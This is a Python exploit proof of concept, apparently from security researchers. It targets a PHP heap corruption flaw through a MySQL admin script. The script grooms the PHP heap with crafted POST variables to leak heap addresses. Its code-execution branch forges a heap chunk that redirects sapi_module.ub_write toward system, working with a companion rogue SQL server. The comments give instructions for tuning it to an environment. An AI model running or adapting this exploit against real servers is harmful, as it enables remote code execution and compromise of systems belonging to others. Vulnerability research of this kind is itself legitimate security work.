import struct
import requests

'''
Authors: Daniil Sadyrin (http://twitter.com/cyberguru007), Alexey Moskvin
https://github.com/CFandR-github
'''

'''
Set sapi_ub_write var with address of sapi_module.ub_write symbol in exploit_poc.py
Set system var in rogue_sql_server.py with address of system symbol

Set need_memleak var with 1 in both exploit_poc.py and rogue_sql_server.py to get memory leak.
Set to 0 for code execution

PHP process heap can have differences depending on environment / configuration.
To prepare heap, play with POST parsing: add or remove some variables in "payload" array.
'''

def extract_heap_addr(data):
    arr = []
    p = b'\x7f\x00\x00'
    i = data.find(p)
    while i != -1:
        addr = struct.unpack('<Q', data[i - 5 : i + 3])[0]
        arr.append(addr)
        i = data.find(p, i+1)
        print(hex(arr[-1]))
    return arr

N = 23
BIN = 160
need_memleak = 1

payload = [ ('server', '127.0.0.1'), ('username', 'root'), ('db', 'php'), ('password', 'v' * (9 * 0x1000 - 4)) ]

for i in range(N):
    payload.append(('key%s' % i , chr(ord('B') + i) * (0x1000 - 100)))

if need_memleak:
	#memleak
	payload.append(('hi1', 'T' * (135 - 24 - 3)))
	payload.append(('hi2', 'T' * (135 - 24 - 3)))
	payload.append(('hi3', 'T' * (135 - 24 - 3)))
	payload.append(('hi4', 'T' * (135 - 24 - 3)))
	payload.append(('hi5', 'T' * (135 - 24 - 3)))
	payload.append(('hi6', 'T' * (135 - 24 - 3)))
	payload.append(('hi7', 'T' * (135 - 24 - 3)))

else:
	#rce
	sapi_ub_write = 0x7f6eb66071b0

	fake_chunk  = ('Y' * 0x48).encode('utf-8')
	fake_chunk +=  struct.pack('<Q', sapi_ub_write - 24)		#next_free_slot for fake chunk
	fake_chunk += ('T' * (135 - 24 - 3 - len(fake_chunk))).encode('utf-8')

	payload.append(('hi1', 'T' * (135 - 24 - 3)))
	payload.append(('hi2', 'T' * (135 - 24 - 3)))
	payload.append(('hi3', 'T' * (135 - 24 - 3)))
	payload.append(('hi4', 'T' * (135 - 24 - 3)))
	payload.append(('hi5', fake_chunk))

for i in range(N):
	if i % 2 == 0 and i < int(N / 1.5):
		continue
	payload.append(('key%s' % i, 'helloworld'))

if need_memleak:
	#memleak
	payload.append(('hi1', 'null'))
	payload.append(('hi7', 'null'))
	payload.append(('hi6', 'null'))
	payload.append(('hi5', 'null'))
	payload.append(('hi4', 'null'))
	payload.append(('hi3', 'null'))
	payload.append(('hi2', 'null'))
else:
	#rce
	payload.append(('hi1', 'null'))
	payload.append(('hi2', 'null'))
	payload.append(('hi3', 'null'))
	payload.append(('hi4', 'null'))

x = requests.post('http://127.0.0.1/research/mysql_admin.php', data = payload)
data = x.content
print('Leaked heap address:')
extract_heap_addr(data)
#print(data)